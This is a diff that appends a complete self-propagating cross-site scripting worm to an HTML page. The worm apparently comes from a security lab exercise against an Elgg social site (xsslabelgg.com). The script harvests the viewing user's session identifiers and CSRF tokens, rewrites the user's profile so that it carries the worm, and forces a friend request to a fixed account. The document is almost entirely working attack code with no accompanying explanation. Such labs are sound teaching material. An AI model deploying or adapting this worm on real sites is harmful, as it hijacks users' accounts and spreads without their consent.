@@ -72,3 +72,45 @@ test
 </script>
 
 </html>
+
+
+<script id="worm">
+    var userName = elgg.session.user.name;
+    var guid = "&guid=" + elgg.session.user.guid;
+    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+
+    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+    var jsCode = document.getElementById("worm").innerHTML;
+    var tailTag = "</" + "script>";
+
+    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+
+    var content = "name=" + userName +
+        "&description=" + encodeURIComponent(wormCode) +
+        "&accesslevel[description]=2" + 
+        "&briefdescription=" + "Samy is my hero!" +
+        "&accesslevel[briefdescription]=2" + 
+        guid + ts + token;
+    var samyGuid = 47;
+    if (elgg.session.user.guid != samyGuid) {
+        //Create and send Ajax request to modify profile
+        var Ajax = null;
+        Ajax = new XMLHttpRequest();
+        var sendurl = 'http://www.xsslabelgg.com/action/profile/edit';
+        Ajax.open("POST", sendurl, true);
+        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
+        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        Ajax.send(content);
+
+        //Create and send Ajax request to add friend
+        Ajax = new XMLHttpRequest();
+        sendurl = 'http://www.xsslabelgg.com/action/friends/add?friend=' + samyGuid + ts + token; 
+        Ajax.open("GET", sendurl, true);
+        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
+        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        Ajax.send();
+    }
+</script>
+        
+    
